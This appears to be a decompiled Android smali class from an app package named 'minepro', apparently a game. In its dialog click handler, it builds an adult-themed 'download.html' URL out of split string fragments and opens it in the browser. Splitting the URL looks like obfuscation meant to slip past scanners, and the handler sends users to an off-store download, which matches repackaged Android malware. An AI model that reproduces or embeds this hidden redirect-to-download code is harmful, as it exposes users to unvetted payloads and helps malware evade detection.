.class Lau/com/stklab/minepro/SelectServer$1$1;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/content/DialogInterface$OnClickListener;


# instance fields
.field final synthetic this$1:Lau/com/stklab/minepro/SelectServer$1;


# direct methods
.method constructor <init>(Lau/com/stklab/minepro/SelectServer$1;)V
    .registers 2

    iput-object p1, p0, Lau/com/stklab/minepro/SelectServer$1$1;->this$1:Lau/com/stklab/minepro/SelectServer$1;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/content/DialogInterface;I)V
    .registers 10

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-string v1, "http://"

    const-string v2, "www.se"

    const-string v3, "xtube-android.c"

    const-string v4, "om/down"

    const-string v5, "load.html"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v6, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const-string v2, "android.intent.action.VIEW"

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    sget-object v1, Lau/com/stklab/minepro/SelectServer;->thisAct:Lau/com/stklab/minepro/SelectServer;

    invoke-virtual {v1, v0}, Lau/com/stklab/minepro/SelectServer;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
